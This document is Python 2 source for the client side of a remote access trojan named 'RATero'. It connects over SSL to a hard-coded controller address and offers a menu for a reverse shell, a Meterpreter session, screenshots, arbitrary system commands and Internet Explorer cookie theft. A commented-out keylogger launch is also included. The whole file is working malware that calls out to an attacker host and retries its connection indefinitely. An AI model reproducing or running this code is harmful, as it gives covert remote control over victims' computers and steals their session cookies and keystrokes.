__author__ = 'Someone'
#coding:utf-8
from General import RATero
from multiprocessing import Process
from os import system
tareas = []
procesos = []
Server = '192.168.181.101'
Port = 9899
kAPP = RATero(servidor=Server,bdoorPort=34567,meterPort=65432)
#Server = 'localhost'

def Command(argumento):
    system(argumento)

def Obedece(host, port):
    from socket import socket, error as fallo, setdefaulttimeout, timeout
    from ssl import wrap_socket, CERT_REQUIRED, socket_error, SSLError
    from time import sleep
    sC = socket()
    setdefaulttimeout(200)
    try:
        ssl_sock = wrap_socket(sC, ca_certs="server.crt", do_handshake_on_connect=True, cert_reqs=CERT_REQUIRED)
        #ssl_sock = wrap_socket(sC)
        ssl_sock.connect((host, port))
        ssl_sock.do_handshake()
        print repr(ssl_sock.getpeername())
        while True:
            orden = ""
            ssl_sock.write("""\n
            ========
            = Menu =
            ========
            1) Reverse Shell (Use terminal with ssl support)
            2) Meterpreter Session
            3) Take Screenshot
            4) Sys command
            5) Cookies\n\n
            option: """)
            orden = ssl_sock.read()
            print ">>>> "+orden
            if orden == "hola\n":
               ssl_sock.write("Saludos")
            # Test de Proceso en background
            ###############################################################
            ###################### Backdoor over SSL ######################
            ###############################################################
            elif orden == '1\n':
                ssl_sock.write("\t"*7+"="*12+"\n"+"\t"*7+"= Backdoor =\n"+"\t"*7+"="*12)
                try:
                    reverseShell = Process(target=kAPP.SecureBackdoor)
                    reverseShell.start()
                    procesos.append(reverseShell.pid)
                except:
                    ssl_sock.write("You must enable a Cipher Socket")
            elif orden == '2\n':
                #########################################################
                ###################### Meterpreter ######################
                #########################################################
                ssl_sock.write("\t"*7+"="*15+"\n"+"\t"*7+"= Meterpreter =\n"+"\t"*7+"="*15)
                meterpreter = Process(target=kAPP.Meterpreter())
                meterpreter.start()
                procesos.append(meterpreter.pid)
            elif orden == '3\n':
                ######################################################
                ##################### Screenshot #####################
                ######################################################
                kAPP.Screenshot()
                ssl_sock.write("Screenshot taken")
                pantallazo = Process(target=kAPP.Screenshot)
                pantallazo.start()
                procesos.append(pantallazo.pid)
            elif orden == "4\n":
                print r''+orden
                ssl_sock.write("\t"*1+" "*4+"Write your command > ")
                resp = ssl_sock.read()
                print "Option: "+resp
                proceso = Process(target=Command, args=(resp,))
                proceso.start()
                tareas.append(proceso.pid)
            elif orden == '5\n':
                #################################################
                ##################### Cookies ###################
                #################################################
                ssl_sock.write("\t"*7+"="*11+"\n"+"\t"*7+"= Cookies =\n"+"\t"*7+"="*11+"\n")
                galletas = kAPP.Cookies()
                # EDITAR ESTO
                resp = ", ".join(galletas)
                #print resp
                try:
                    ssl_sock.write("\t"*6+"Internet Explorer Cookies\n\n{0}".format(resp))
                except:
                    ssl_sock.write("galletas Exception")
            elif orden == '6\n':
                try:
                    procc = ", ".join(procesos)
                    ssl_sock.write(procc)
                except:
                    ssl_sock.write("No process running in background")
                    print "No process running in background"
            else:
                ssl_sock.write("No Entiendo")
    except:
        print "Error Unexpected"
        for i in xrange(10,0,-1):
            print "Trying in * %s" % i
            sleep(1)
        Obedece(Server, Port)

if __name__ == '__main__':
    ######################
    # Procesos Autonomos #
    ######################
    #########################################################
    # Cargar Keylogger al iniciar el programa en un proceso #
    #########################################################
    #kAPP = RATero()
    #jobs = []
    #kloggerProcess = Process(target=kAPP.Keylogger)
    #jobs.append(kloggerProcess)
    #kloggerProcess.start()
    # #print "Keylogger ->", kloggerProcess.pid
    #procesos.append(kloggerProcess.pid)
    #
    ###############################################
    # Cargando el proceso para conectarse al JEFE #
    ###############################################
    try:
        from time import sleep
        obdc = Process(target=Obedece, args=(Server, Port,))
        obdc.start()
        print "Connecting"
        procesos.append(obdc.pid)
        print procesos
    except:
        print "Fail Connecting"
    #for i in range(10):
    #    print "Preparando en %s"%i
    #    sleep(1)
